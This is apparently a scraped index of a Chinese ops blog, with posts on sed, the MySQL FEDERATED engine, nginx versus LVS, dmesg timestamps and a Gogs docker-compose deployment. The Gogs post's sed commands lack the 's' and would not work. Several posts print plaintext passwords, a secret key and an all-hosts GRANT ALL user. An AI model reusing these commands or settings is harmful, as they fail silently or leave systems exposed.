EEEbbbcccddd aaabbbcccddd EEEbbbcccddd aaabbbcccddd AAABBBCCCDDD EEEbbbcccddd AAABBBCCCDDD EEEbbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ $ sed -n -e 's/aaa/EEE/p' input.txt EEEbbbcccddd aaabbbcccddd AAABBBCCCDDD EEEbbbcccddd w标志后接输出文件, 只写入替换的行; w命令输出包括不匹配的行:\n$ sed -e 's/aaa/EEE/w output.txt' input.txt EEEbbbcccddd aaabbbcccddd AAABBBCCCDDD EEEbbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ $ more output.txt EEEbbbcccddd aaabbbcccddd AAABBBCCCDDD EEEbbbcccddd $ sed -e 's/aaa/EEE/' -e 'w output.txt' input.txt EEEbbbcccddd aaabbbcccddd AAABBBCCCDDD EEEbbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ $ more output.txt EEEbbbcccddd aaabbbcccddd AAABBBCCCDDD EEEbbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ y 命令替换1个字符, 可以同时替换多个字符(和s命令不一样, y会替换一行中所有匹配的, 不需要g标志):\n # a -\u0026gt; E $ sed -e 'y/a/E/' input.txt EEEbbbcccddd EEEbbbcccddd AAABBBCCCDDD EEEbbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ # a -\u0026gt; E; b -\u0026gt; F $ sed -e 'y/ab/EF/' input.txt EEEFFFcccddd EEEFFFcccddd AAABBBCCCDDD EEEFFFcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ d 命令删除, 可以指定行或全部:\n$ sed -e '2d' input.txt aaabbbcccddd aaabbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ $ sed -e '1,2d' input.txt 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ # 输出空 $ sed -e 'd' input.txt 地址(限制行数):\n 默认未指定则是所有数据 3: 第3行 20,$: 从第20行到最后一行 10,5: 第10行; 如果结束行比开始行小, 则只有开始行 /^[0-9]/ : 所有以数字开头的行 15,/Z$/ : 从第15行到以Z结束的行为止 5,10! : 第5行到除第10行以外的行(5-9, 11-最后一行)  例子:\n$ more input.txt abcd 1234 1aff cd23 $ sed '/^[0-9]/s/.*/output: \u0026amp;/' input.txt abcd output: 1234 output: 1aff cd23 执行多个命令. 这里就是-e的用处了; 还可以用;分割:\n$ sed -e '2d' -e 's/bbb/EEE/' input.txt aaaEEEcccddd aaabbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ $ sed '2d;s/bbb/EEE/' input.txt aaaEEEcccddd aaabbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ 关于写文件, 除了之前用到的重定向标准输出, w命令/标志, 还可以用-i直接写源文件本身.\n在-i可接一个后缀表示先备份替换前的源文件, 再直接写入源文件:\n$ sed -i.bak '2d;s/bbb/EEE/' input.txt $ more input.txt aaaEEEcccddd aaabbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ $ more input.txt.bak aaabbbcccddd aaabbbcccddd AAABBBCCCDDD aaabbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ 注意, 一般情况下, sed的替换规则用单引号, 除非想使用一些自定义或环境变量.\n可以把sed的替换命令写入文件, 使用-f选项读取.\n$ more sample.sed 2d s/bbb/EEE/ $ sed -f sample.sed input.txt aaaEEEcccddd aaabbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ 可以用花括号{}对命令进行组合:\n$ more sample.sed 1,3{ s/aaa/EEE/g y/abc/XYZ/ } $ sed -f sample.sed input.txt EEEYYYZZZddd EEEYYYZZZddd AAABBBCCCDDD EEEYYYZZZddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ 在匹配行末尾加入某些字符 $ cat a.txt tset test 123 $ sed '/test/s/$/000/' a.txt tset test000 123 在匹配行行首加入某些字符 $ cat test test 1234 home sed gerp grep $ sed '/grep/s/^/#\u0026amp;/' test test 1234 home sed gerp #grep 说明下： s/^/#\u0026amp;/,^字符匹配行首，#字符是一般字符表示添加该字符,\u0026amp;即表示前面的正则表达式匹配出来的部分 资料  man手册 sed sed Software Design 03 - sed详解及用法  ","permalink":"https://www.fenghong.tech/blog/tools/sed/","tags":["sed","Linux"],"title":"sed基础用法"},{"categories":["ops"],"contents":"[TOC]\n如何在发布的时候有效的避免故障发生呢？\n发布前：\n单元测试、集成测试 负责参与并审核架构设计的合理性和可运维性，以确保在产品发布之后能高效稳定的运行。 预发布、灰度、分批发布 负责用自动化的技术或者平台确保产品可以高效的发布上线，之后可以快速稳定迭代。 goc故障预警 负责保障产品7*24H稳定运行，在此期间对出现的各种问题可以快速定位并解决；在日常工作中不断优化系统架构和部署的合理性，以提升系统服务的稳定性。 ","permalink":"https://www.fenghong.tech/blog/ops/release-to-production/","tags":["ops","devops"],"title":"运维发布应考虑什么"},{"categories":["mysql"],"contents":"FEDERATED 存储引擎描述 FEDERATED存储引擎能让你访问远程的MySQL数据库而不使用replication或cluster技术(类似于Oracle的dblink),使用FEDERATED存储引擎的表,本地只存储表的结构信息,数据都存放在远程数据库上,查询时通过建表时指定的连接符去获取远程库的数据返回到本地。 FEDERATED存储引擎默认不启用 如果是使用的源码，需要使用CMake 加上DWITH_FEDERATED_STORAGE_ENGINE选项。 如果是二进制包,则在启动MySQL时指定 [--federated] 选项开启或在my.cnf文件中的[mysqld]部分加上federated参数 FEDERATED 存储引擎架构 1 本地服务器 FEDERATED 存储引擎的表只存放表的.frm结构文件 2 远程服务器 存放了.frm和数据文件 3 增删改查操作都是通过建立的连接来访问远程数据库进行操作,把结果返回给本地。 4 远程数据表的存储引擎为MySQL支持的存储引擎,如MyISAM,InnoDB等 FEDERATED 存储引擎操作步骤 远程库: 开启 FEDERATED 存储引擎 建立远程访问用户 授予访问对象的权限 本地库： 测试登陆远程库是否能成 创建 FEDERATED 表 查询是否成功 select engine,support from information_schema.engines where engine=\u0026#39;FEDERATED\u0026#39;; +-----------+---------+ | engine | support | +-----------+---------+ | FEDERATED | YES | +-----------+---------+ 1 row in set (0.00 sec) --也可使用show engines查看支持的存储引擎 (root@localhost) [(none)]\u0026gt;show engines; --排版问题不贴出执行结果 --如果support 为NO,则需要在my.cnf中[mysqld]增加federated参数,并重启MySQL服务器生效配置 建立远程访问用户并授权 (root@localhost) [(none)]\u0026gt;select user,host from mysql.user; --查看数据库用户 +-----------+-----------+ | user | host | +-----------+-----------+ | root | % | | mysql.sys | localhost | | root | localhost | +-----------+-----------+ 3 rows in set (0.00 sec) (root@localhost) [(none)]\u0026gt;create user 'fed'@'%' identified by 'fed_test'; --创建一个federated连接的用户 Query OK, 0 rows affected (0.00 sec) (root@localhost) [(none)]\u0026gt;grant all on employees.* to 'fed'@'%'; --授予创建的fed用户访问employees数据库所有表的权限 Query OK, 0 rows affected (0.00 sec) (root@localhost) [(none)]\u0026gt;select user,host from mysql.user; --查看用户信息 +-----------+-----------+ | user | host | +-----------+-----------+ | fed | % | | root | % | | mysql.sys | localhost | | root | localhost | +-----------+-----------+ 4 rows in set (0.00 sec) (root@localhost) [(none)]\u0026gt;show grants for 'fed'@'%'; --查看用户权限 +----------------------------------------------------+ | Grants for fed@% | +----------------------------------------------------+ | GRANT USAGE ON *.* TO 'fed'@'%' | | GRANT ALL PRIVILEGES ON `employees`.* TO 'fed'@'%' | +----------------------------------------------------+ 2 rows in set (0.00 sec) 本地库 测试登陆远程库是否能成 [root@RHEL6 ~]# mysql -ufed -h172.25.21.10 -P3306 -p --在本地服务器上去连接远程库 Enter password: Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 23 Server version: 5.7.10-log MySQL Community Server (GPL) Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. fed@172.25.21.10 [(none)]\u0026gt; --成功通过远程机新建的用户登录上远程数据库 --如果没有连接成功 判断是否防火墙的问题 查看端口是否正确 创建本地 FEDERATED 表 root@localhost [(none)]\u0026gt;create database test; --在本地创建一个数据库,也可使用已存在的数据库 Query OK, 1 row affected (0.01 sec) root@localhost [(none)]\u0026gt;use test; --使用新建的数据库 Database changed root@localhost [test]\u0026gt;CREATE TABLE `employees_fed` ( -\u0026gt; `emp_no` int(11) NOT NULL, -\u0026gt; `birth_date` date NOT NULL, -\u0026gt; `first_name` varchar(14) NOT NULL, -\u0026gt; `last_name` varchar(16) NOT NULL, -\u0026gt; `gender` enum('M','F') NOT NULL, -\u0026gt; `hire_date` date NOT NULL, -\u0026gt; PRIMARY KEY (`emp_no`) -\u0026gt; ) ENGINE=federated DEFAULT CHARSET=utf8mb4 -\u0026gt; connection='mysql://fed:fed_test@172.25.21.10:3306/employees/employees'; Query OK, 0 rows affected (0.00 sec) connection语法： scheme://user_name[:password]@host_name[:port_num]/db_name/tbl_name 具体语法及含义参考官方文档链接: http://dev.mysql.com/doc/refman/5.7/en/federated-create-connection.html --创建完成federated存储引擎的表,注意:本地表employees_fed的结构要和远程表employees一样,可以提前在远程表中通过show create table table_name来获取表结构并修改或增加标红的语句。 验证是否配置成功 root@localhost [test]\u0026gt;select * from employees_fed limit 10; --成功获取到远程数据库中的数据 +--------+------------+------------+-----------+--------+------------+ | emp_no | birth_date | first_name | last_name | gender | hire_date | +--------+------------+------------+-----------+--------+------------+ | 10001 | 1953-09-02 | Georgi | Facello | M | 1986-06-26 | | 10002 | 1964-06-02 | Bezalel | Simmel | F | 1985-11-21 | | 10003 | 1959-12-03 | Parto | Bamford | M | 1986-08-28 | | 10004 | 1954-05-01 | Chirstian | Koblick | M | 1986-12-01 | | 10005 | 1955-01-21 | Kyoichi | Maliniak | M | 1989-09-12 | | 10006 | 1953-04-20 | Anneke | Preusig | F | 1989-06-02 | | 10007 | 1957-05-23 | Tzvetan | Zielinski | F | 1989-02-10 | | 10008 | 1958-02-19 | Saniya | Kalloufi | M | 1994-09-15 | | 10009 | 1952-04-19 | Sumant | Peac | F | 1985-02-18 | | 10010 | 1963-06-01 | Duangkaew | Piveteau | F | 1989-08-24 | +--------+------------+------------+-----------+--------+------------+ 10 rows in set (0.36 sec) root@localhost [test]\u0026gt;show variables like 'datadir'; --查看数据文件存放目录 +---------------+-----------------+ | Variable_name | Value | +---------------+-----------------+ | datadir | /var/lib/mysql/ | +---------------+-----------------+ 1 row in set (0.00 sec) root@localhost [test]\u0026gt;system ls -l /var/lib/mysql/test/* -rw-rw----. 1 mysql mysql 61 Mar 30 13:41 /var/lib/mysql/test/db.opt -rw-rw----. 1 mysql mysql 8768 Mar 30 13:41 /var/lib/mysql/test/employees_fed.frm --确定本地只保存了表的结构信息 --配置成功 使用 CREATE SERVER 方式创建 FEDERATED表 --创建一个server root@localhost [test]\u0026gt;CREATE SERVER emp_link -\u0026gt; FOREIGN DATA WRAPPER mysql -\u0026gt; OPTIONS (USER 'fed', PASSWORD 'fed_test',HOST '172.25.21.10',PORT 3306,DATABASE 'employees'); CREATER SERVER语法： CREATE SERVER server_name FOREIGN DATA WRAPPER wrapper_name OPTIONS (option [, option] ...) 具体语法及含义参考官方文档链接: http://dev.mysql.com/doc/refman/5.7/en/federated-create-server.html --查看已创建的server root@localhost [test]\u0026gt;select * from mysql.servers\\G; *************************** 1. row *************************** Server_name: emp_link Host: 172.25.21.10 Db: employees Username: fed Password: fed_test Port: 3306 Socket: Wrapper: mysql Owner: 1 row in set (0.00 sec) 创建基于SERVER 的FEDERATED表 root@localhost [test]\u0026gt;CREATE TABLE `employees_link` ( -\u0026gt; `emp_no` int(11) NOT NULL, -\u0026gt; `birth_date` date NOT NULL, -\u0026gt; `first_name` varchar(14) NOT NULL, -\u0026gt; `last_name` varchar(16) NOT NULL, -\u0026gt; `gender` enum('M','F') NOT NULL, -\u0026gt; `hire_date` date NOT NULL, -\u0026gt; PRIMARY KEY (`emp_no`) -\u0026gt; ) ENGINE=FEDERATED DEFAULT CHARSET=utf8mb4 -\u0026gt; CONNECTION='emp_link/employees'; Query OK, 0 rows affected (0.01 sec) 验证是否配置成功 root@localhost [test]\u0026gt;select * from employees_link limit 10; +--------+------------+------------+-----------+--------+------------+ | emp_no | birth_date | first_name | last_name | gender | hire_date | +--------+------------+------------+-----------+--------+------------+ | 10001 | 1953-09-02 | Georgi | Facello | M | 1986-06-26 | | 10002 | 1964-06-02 | Bezalel | Simmel | F | 1985-11-21 | | 10003 | 1959-12-03 | Parto | Bamford | M | 1986-08-28 | | 10004 | 1954-05-01 | Chirstian | Koblick | M | 1986-12-01 | | 10005 | 1955-01-21 | Kyoichi | Maliniak | M | 1989-09-12 | | 10006 | 1953-04-20 | Anneke | Preusig | F | 1989-06-02 | | 10007 | 1957-05-23 | Tzvetan | Zielinski | F | 1989-02-10 | | 10008 | 1958-02-19 | Saniya | Kalloufi | M | 1994-09-15 | | 10009 | 1952-04-19 | Sumant | Peac | F | 1985-02-18 | | 10010 | 1963-06-01 | Duangkaew | Piveteau | F | 1989-08-24 | +--------+------------+------------+-----------+--------+------------+ 10 rows in set (0.35 sec) --配置成功 --这种方式的好处在于创建本地FEDERATED表时,在connection中直接指定已经创建好的server link,不需要每次都配置一个新的连接。 --并且便于统一管理,只需要修改server link即可 FEDERATED 引擎使用注意事项 1、FEDERATED 表可能会被复制到其他的slave数据库,你需要确保slave服务器也能够使用定义在connection中或mysql.servers表中的link的用户名/密码 连接上远程服务器。 2、远程服务器必须是MySQL数据库 3、在访问FEDERATED表中定义的远程数据库的表前,远程数据库中必须存在这张表。 4、FEDERATED 表不支持通常意义的索引,服务器从远程库获取所有的行然后在本地进行过滤,不管是否加了where条件或limit限制。 --查询可能造成性能下降和网络负载,因为查询返回的数据必须存放在内存中,所以容易造成使用系统的swap分区或挂起。 5、FEDERATED表不支持字段的前缀索引 6、FEDERATED表不支持ALTER TABLE语句或者任何DDL语句 7、FEDERATED表不支持事务 8、本地FEDERATED表无法知道远程库中表结构的改变 9、任何drop语句都只是对本地库的操作,不对远程库有影响 软件和硬件费用如下：\n   名称 CPU总数 内存 硬盘大小 数量(台) 价格(万元/年) 总价(万元/年)     应用服务器 8 24 G 320.0 G 10 1.1 11   数据库MySQL 32 24 G 200G 4 1.3 5.2   redis服务器 32 1G 1G 1 0.1 0.1   台式电脑 I5-8400 16G 1220G 54 0.5 27   合计      43.3    宽带费用: 服务器所用公网带宽为40M，每年的费用为4.5 万元。\n云安全费用： 10 万元\n短信费用： 5万元\n测试手机费用：2.15万元\n   序号 型号 运行内存 存储空间 系统 价格(万元)     1 iPhone6SP 2GB 32GB 10.3.3 0.5   2 iPhone6 1GB 16GB 12.1.4 0.5   3 iPhone5S 1GB 16GB 11.1.2 0.5   4 三星 SM-J5108 4GB 16GB 5.1.1 0.1   5 荣耀 SCL-AL00 2GB 8GB 5.1.1 0.05   5 荣耀 SCL-AL00 2GB 8GB 5.1.1 0.05   6 荣耀 CAM-TL00H 2GB 16GB 6.0.0 0.1   7 华为 P7-L07 2GB 16GB 5.1.1 0.05   8 红米手机 2GB 16GB 4.4.4 0.05   9 红米手机 2GB 16GB 5.1.1 0.05   10 OPPOK1 4GB 64GB 8.1.0 0.1   11 荣耀10青春版 ALOOa 4GB 64GB 9.0.1 0.1    智能办公费用： 9.88\n   名称 单价 数量 总价     远程视频会议系统 2.5 2 5   智能会议 1.9 2 3.8   环信即时通讯 0.54 2 1.08    合计： 74.83 万元\n","permalink":"https://www.fenghong.tech/blog/mysql/mysql-federated/","tags":["mysql","federated"],"title":"MySQL FEDERATED"},{"categories":["ops"],"contents":"[TOC]\n​ lvs和nginx 都可以用作多机负载方案，他们各有优缺点，在生产环境中需要好好分析实际情况并加以利用。\n一、lvs的优势： ​ 1.抗负载能力强，因为lvs工作方式的逻辑是非常简单的，而且工作再网络层第4层，仅作请求分发用，没有流量，所以在效率上基本不需要太过考虑。lvs一般很少出现故障，即使出现故障一般也是其他地方（如内存、CPU等）出现问题导致lvs出现问题。\n​ 2.配置性地，这通常是一大劣势同时也是一大优势，因为没有太多的可配置的选项，所以除了增减服务器，并不需要经常去触碰它，大大减少了人为出错的几率。\n​ 3.工作稳定，因为其本省抗负载能力很强，所以稳定性高也是顺理成章的事，另外各种lvs都有完整的双机热备方案，所以一点不用担心均衡器本身会出什么问题，节点出现故障的话，lvs会自动判别，所以系统整体式非常稳定的。\n​ 4.无流量，lvs仅仅分发请求，而流量并不从它本身出去，所以可以利用它这点来做一些线路分流之用。没有流量同时也保住了均衡器的IO性能不会受到大流量的影响。\n​ 5.lvs基本上能支持所有应用，因为绿色工作在第4层，所以它可以对几乎所有应用做负载均衡，包括http、数据库、聊天室等。\n​ 另外：lvs也不是完全能判别节点故障的，比如在wlc分配方式下，集群里有一个节点没有配置vip，会使整个集群不能使用，这时使用wrr分配方式则会丢掉一台机器。目前这个问题还在进一步测试中。所以用lvs也得多多当心为妙。\n二、nginx和lvs作对比的结果： ​ 1.nginx工作在网络的第7层，所以它可以针对http应用本身来做分流策略，比如针对域名、目录结构等，相比之下lvs并不具备这样的功能，所以nginx单凭这点可以利用的场合就远多于lvs了；但nginx有用的这些功能使其可调整度要高于lvs，所以经常要去触碰触碰，由lvs的第2条优点来看，触碰多了，人为出现问题的几率也就会大。\n​ 2.nginx对网络的依赖较小，理论上只要ping得通，网页访问正常，nginx就能连得通，nginx同时还能区分内外网，如果是同时拥有内外网的节点，就相当于单机拥有了备份线路；lvs就比较依赖于网络环境，目前来看服务器在同一网段内并且lvs使用direct方式分流，效果较能得到保证。另外注意，lvs需要向托管商至少申请多于一个ip来做visual ip，貌似是不能用本省的ip来做VIP的。要做好lvs管理员，确实得跟进学习很多有关网络通信方面的知识，就不再是一个http那么简单了。\n​ 3.nginx安装和配置比较简单，测试起来也很方便，因为它基本能把错误用日志打印出来。lvs的安装和配置、测试就要花比较长的时间，因为同上所述，lvs对网络依赖性比较大，很多时候不能配置成功都是因为网络问题而不是配置问题，出了问题要解决也相应的会麻烦的多。\n​ 4.nginx也同样能承受很高负载且稳定，但负载度很稳定度差lvs还有几个等级：nginx处理所有流量所以受限于机器IO和配置；本身的bug也还是难以避免的；nginx没有现成的双机热备方案，所以跑在单机上还是风险比较大，单机上的事情全都很难说。\n​ 5.nginx可以检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点。目前lvs中ldirectd也能支持针对服务器内部的情况来监控，但lvs的原理使其不能重发请求。重发请求这点，比如用户正在上传一个文件，而处理该上传的节点刚好在上传过程中出现故障，nginx会把上传切到另一台服务器重新处理，而lvs就直接断掉了，如果是上传一个很大的文件或者很重要的文件的话，用户可能会因此而恼火。\n​ 6.nginx对请求的异步处理可以帮助节点服务器减轻负载，键入使用Apache直接对外服务，那么出现很多的窄带链接时Apache服务器将会占用大量内存而不能释放，使用多于一个nginx做Apache代理的话，这些窄带链接会被nginx挡住，Apache上就不会堆积过多的请求，这样就减少了相当多的内存占用。这点使用squid也有相同的作用，即使squid本身配置为不缓存，对Apache还是有很大帮助你的。lvs没有这些功能，也就无法能比较。\n​ 7.nginx能支持http和Email（Email的功能估计比较少人用），lvs所支持的应用在这点上会比nginx更过。\n​ 在使用上，一般最前端所采取的的策略应是lvs，也就是dns的指向应为lvs均衡器，lvs的优点另它非常适合做这个任务。\n​ 重要的ip地址，最好交由lvs托管，比如数据库的ip、webservice服务器的ip等等，这些ip地址随着时间推移，使用面会越来越大，如果更换ip则故障会接踵而来。所以将这些重要ip交给lvs托管式最为稳妥的，这样做的唯一缺点是需要VIP数量会比较多。\n​ nginx可以作为lvs节点机器使用，一是可以利用nginx的功能，二是可以利用nginx的性能。当然这一层面也可以直接使用squid，squid的功能方面就比nginx弱不少，性能上也有所逊色于nginx。\n​ nginx也可以作为中层代理使用，这一层面nginx基本上无对手，唯一可以撼动nginx的就只有lighttpd了，不过lighttpd目前还没有能做到nginx完全的功能，配置也不那么清晰易读。另外，中层代理的ip也是重要的，所以中层代理业拥有一个VIP和lvs是最完美的方案了。\n​ nginx也可以作为网页静态服务器。\n​ 具体的应用还得具体分析，如果是比较小的网站（日pv\u0026lt;1000万），用nginx就完全可以了，如果机器也不少，可以用dns轮询，lvs所耗费的机器还是比较多的；大型网站或者重要的服务，机器不发愁的时候要多多考虑利用lvs。\n说明： ​ 使用nginx+keepalived实现负载均衡，解决单点与高流量并发问题。为什么要用nginx而不用lvs？\n​ 7个理由：\n​ 1.高并发连接：官方测试能够支撑5万并发连接，在实际生产环境中跑到2——3万并发连接数。\n​ 2.内存消耗少：在3万并发连接数下，开启的10个nginx进程才消耗150M内存（150*10=150M）。\n​ 3.配置文件非常简单：风格跟程序一样通俗易懂。\n​ 4.成本低廉：nginx为开源软件，可以免费使用。而购买F5 big-ip、netscaler等硬件负载均衡交换机则需要十多万至几十万人民币。\n​ （使用nginx做七层负载均衡的理由？）\n​ 5.支持rewrite重写规则：能够根据域名、url的不同，将http请求分到不同的后端服务器群组。\n​ 6.内置的健康检查功能：如果nginx proxy后端的某台web服务器宕机了，不会影响前端访问。\n​ 7.节省带宽：支持gzip压缩，可以添加浏览器本地缓存的header头。\n​ 进一步说明：\n​ keepalived是linux下面实现vrrp备份路由的高可靠性运行件。基于keepalived设计的服务模式能够真正做到主服务器和备份服务器故障时ip瞬间无缝交接。\n​ nginx是基于linux2.6内核中epoll模型http服务器，与Apache进程派生模式不同的是nginx进程基于master+slave多进程模型，自身具有非常稳定的子进程管理功能。在master进程分配模式下，master进程永远不进行业务处理，只是进行任务分发，从而达到master进程的存活高可靠性，slave进程所有的业务信号都由主进程发出，slave进城所有的超时任务都会被master终止，属于阻塞式人物模型。\n​ 服务器ip存活检测是由keepalived自己本身完成的，将2台服务器配置成keepalived互为主辅关系，任意一方机器故障对方都能够将ip接管过去。\n​ keepalived的服务器ip通过其配置文件进行管理，依靠其自身的进程去确定服务器的存活状态，如果在需要对服务器进程在线维护的情况下，只需要停掉被维护机器的keepalived服务进程，另外一台服务器就能够接管该台服务器的所有应用。\n20190602 下午 5:42\n mysql单表备份，针对一个达到20G的数据库单表，如何做？ tomcat性能调优， jvm性能调优 ，说下心得吧？ nginx如何加载第三方模块？ ansible如何批量修改主机名，主机名已经有模板，如何做？ redis的性能吃紧，如何进行优化？ redis的数据持久化方式以及数据淘汰方式？ cdn的架构，部署一个cdn，有哪些难点 ？ 如何处理一个20G文件，取每一行的倒数第二行的数据 ？ nginx如何实现灰度发布？  ","permalink":"https://www.fenghong.tech/blog/technology/lvs-nginx/","tags":["nginx","lvs"],"title":"nginx \u0026 lvs "},{"categories":["tools"],"contents":"[TOC]\n公司系统是centos6.5的，生产环境偶发一次oom，想查询更多细节的问题，通过dmesg查询oom情况时，发现没有时间戳，于是有了这篇文章。\n日志无时间戳的原因  CentOS 7之前的版本的dmesg日志是没有时间戳的，原因是util-linux-ng版本太低,不具备日期显示功能 原因是/sys/module/printk/parameters/time为N即0，不开启状态 /sys/module/*包含所有编译的模块信息   这里有系统中所有模块的信息，不论这些模块是以内联(inlined)方式编译到内核映像文件(vmlinuz)中还是编译为外部模块(ko文件)，都可能会出现在 /sys/module 中：\n 编译为外部模块(ko文件)在加载后会出现对应的 /sys/module/\u0026lt;module_name\u0026gt;/, 并且在这个目录下会出现一些属性文件和属性目录来表示此外部模块的一些信息，如版本号、加载状态、所提供的驱动程序等； 编译为内联方式的模块则只在当它有非0属性的模块参数时会出现对应的 /sys/module/\u0026lt;module_name\u0026gt;, 这些模块的可用参数会出现在 /sys/modules//parameters/\u0026lt;param_name\u0026gt; 中    /sys/module/printk/parameters/time 这个可读写参  修改/sys/module/printk/parameters/time参数  使其开始为今后日志添加时间戳，但是重启后会失效 可以使用dmesg查询  ]$ echo 1 \u0026gt;/sys/module/printk/parameters/time ]$ cat /sys/module/printk/parameters/time Y 在监控日志配置/etc/rsyslog.conf中，添加监控kern的信息，并重启rsyslog服务  从服务重启后开始生效，kern日志都记录在/var/log/kern.log中 但重启后用dmesg查看的日志依然没有时间戳；因为/sys/下的目录存放的是系统内存的信息，重启会失效； 同时，/var/log/kern.log中的日志的时间格式是人类易读的  ]$ sed -i \u0026#39;/local7/a\\kern.* /var/log/kern.log\u0026#39; /etc/rsyslog.conf ]$ grep kern.log /etc/rsyslog.conf kern.* /var/log/kern.log ]$ service rsyslog restart Shutting down system logger: [ OK ] Starting system logger: [ OK ] $ 时间戳转换  由于dmesg时间戳可读性很差  $ dmesg [18609174.454942] Adding 524280k swap on /swapfile. Priority:-1 extents:4 across:663544k [18609179.675345] Adding 524280k swap on /swapfile. Priority:-1 extents:4 across:663544k  利用awk来进行转换时间戳  $ vim ts_dmesg.sh #!/bin/sh uptime_ts=`cat /proc/uptime | awk \u0026#39;{ print $1}\u0026#39;` #echo $uptime_ts dmesg | awk -v uptime_ts=$uptime_ts \u0026#39;BEGIN { now_ts = systime(); start_ts = now_ts - uptime_ts; #print \u0026#34;system start time seconds:\u0026#34;, start_ts; #print \u0026#34;system start time:\u0026#34;, strftime(\u0026#34;[%Y/%m/%d %H:%M:%S]\u0026#34;, start_ts); } { print strftime(\u0026#34;[%Y/%m/%d %H:%M:%S]\u0026#34;, start_ts + substr($1, 2, length($1) - 2)), $0 }\u0026#39; $ bash ts_dmesg.sh [2019/05/16 09:10:59] [18609174.454942] Adding 524280k swap on /swapfile. Priority:-1 extents:4 across:663544k [2019/05/16 09:11:04] [18609179.675345] Adding 524280k swap on /swapfile. Priority:-1 extents:4 across:663544k ps： centos7.0以上，dmesg自带时间戳，dmesg -T 即可转换\n参考 dmesg添加时间戳\n","permalink":"https://www.fenghong.tech/blog/tools/dmesg/","tags":["dmesg"],"title":"dmesg 添加时间戳"},{"categories":["ops"],"contents":"[TOC]\n介绍  Have you used Gogs? It’s great. Gogs is a Git service, much like GitHub and GitLab, but written in Go. It’s a immensely lighter than GitLab and it’s not lacking at all in features.\n Gogs仓库构建 gogs 安装方式很多，二进制安装/源码安装/docker安装,具体细节可以查看官网或者github\n这里我选择的是docker-compose安装,使用docker-compose方便快捷.\n安装docker 这里不便赘述查看先前写的安装kubernetes里面的安装docker步骤\n当然也可以选择官网安装\n 安装docker-compose  $ curl -L https://github.com/docker/compose/releases/download/1.24.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose $ chmod +x /usr/local/bin/docker-compose  编写docker-compose.yml文件  $ cd /data/gogs $ vi docker-compose.yml version: '2' services: gogsdb: container_name: gogsdb volumes: - \u0026quot;/usr/local/mariadb/data:/var/lib/mysql\u0026quot; restart: always ports: - \u0026quot;3306:3306\u0026quot; environment: MYSQL_ROOT_PASSWORD: $PASSWORD MYSQL_DATABASE: gogs MYSQL_USER: $USER MYSQL_PASSWORD: $PASSWORD gogs: container_name: gogs depends_on: - gogsdb volumes: - /var/gogs:/data links: - gogsdb ports: - \u0026quot;10080:3000\u0026quot;\t#暴露的http端口 - \u0026quot;10022:22\u0026quot;\t#暴露的ssh端口,按照自己的喜好更换\trestart: always jenkins: container_name: jenkins restart: always ports: - 18080:8080 - 50000:50000 links: - gogs:gogs volumes: - /data/jenkins:/var/jenkins_home  启动服务  $ docker-compose up -d  停止服务  $ docker-compose down -v gogs配置文件 部署成功后,直接访问gogs项目,然后开始进行配置\n首先是数据库的配置按照配置文件写入即可\n其次是应用的基本设置,这个设置比较重要,关系到git clone的操作参数\n其中应用名称,可以写公司的名称,比如gogs;仓库的根目录/data/git/gogs-repositories,可以选择默认\n域名选择以后想要git clone的域名,比如gogs.wangke.co,ssh端口号填写自己映射的端口比如10022\nhttp端口号这个必须写3000,这个监听在容器内,不然容器起不来.\n应用Url,填写git clone的http服务的url,比如http://gogs.wangke.co:10080/,这里端口填写自己对外映射的端口.这里我做了一次反向代理了,使用nginx反向代理了本地的http://127.0.0.1:10080.所以把端口省略了.\nadmin选项自己填写即可.以下是生成的app.ini配置文件.\nAPP_NAME = Gogs RUN_USER = git RUN_MODE = prod [database] DB_TYPE = mysql HOST = gogsdb:3306 NAME = gogs USER = $USER PASSWD = $PASSWORD SSL_MODE = disable PATH = data/gogs.db [repository] ROOT = /data/git/gogs-repositories [server] DOMAIN = gogs.wangke.co HTTP_PORT = 3000 ROOT_URL = http://gogs.wangke.co/ DISABLE_SSH = false SSH_PORT = 10022 START_SSH_SERVER = false OFFLINE_MODE = false [mailer] ENABLED = false [service] REGISTER_EMAIL_CONFIRM = false ENABLE_NOTIFY_MAIL = false DISABLE_REGISTRATION = false ENABLE_CAPTCHA = true REQUIRE_SIGNIN_VIEW = false [picture] DISABLE_GRAVATAR = false ENABLE_FEDERATED_AVATAR = false [session] PROVIDER = file [log] MODE = file LEVEL = Info ROOT_PATH = /app/gogs/log [security] INSTALL_LOCK = true SECRET_KEY = RNcQAMf374kihMd 改变ssh端口为22  使用ssh默认的22端口,看起来会比较优雅,这里可以看一下gogs官网推荐的一篇文章.  在Docker和本地系统内的Gogs之间共享端口22\n  解决方案\n这里提供我的思路,不用利用realServer的ssh来映射默认的22端口,宿主机因为安全问题,我一般都会改变ssh的默认端口,比如改22端口为9527,这里,系统默认的ssh端口22就空出来了,刚好可以作为gogs的补缺.直接将gogs容器端口22映射到宿主机的端口22.更改配置文件里面的SSH_PORT 为22,即可.\n  $ cd /data/gogs $ sed -i \u0026quot;/10022/22/g\u0026quot; docker-compose.yml $ sed -i \u0026quot;/SSH_PORT = 10022/SSH_PORT = 22/g\u0026quot; /var/gogs/gogs/conf/app.ini $ docker restart mygogs  如果主机的ssh端口为改变,可以参照gogs官方网站推荐的进行操作~  